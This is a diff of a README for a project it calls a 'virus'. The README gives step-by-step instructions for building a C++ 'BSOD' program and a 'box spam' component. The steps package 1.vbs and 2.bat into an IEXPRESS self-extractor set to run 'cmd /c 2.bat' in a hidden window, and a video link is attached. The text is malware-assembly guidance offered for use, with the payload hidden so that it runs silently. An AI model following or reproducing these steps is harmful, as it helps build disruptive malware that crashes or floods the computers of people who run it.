@@ -19,9 +19,12 @@ To build the virus in Visual Studio you must have
 https://drive.google.com/file/d/1JQe1erpH6BDPo3f6EdO_pVXnKxQ-WkA-/view?usp=sharing
 (the mp4 video)
 
-And Build the BSOD and have Box Spam Compiled.
+Build the BSOD and have Box Spam Compiled.
+
 Build BSOD in C++, just copy the main code.
+
 In the box spam follow the steps:
+
 1.Open CMD as a administrator
 
 2.Type "start IEXPRESS" (without the quotes)
@@ -34,7 +37,7 @@ In the box spam follow the steps:
 
 6.Add 1.vbs and 2.bat
 
-7.In install program type (without the quotes)"cmd /c 2.bat"
+7.In install program type (without the quotes) "cmd /c 2.bat"
 
 8.Put "Hidden"
 
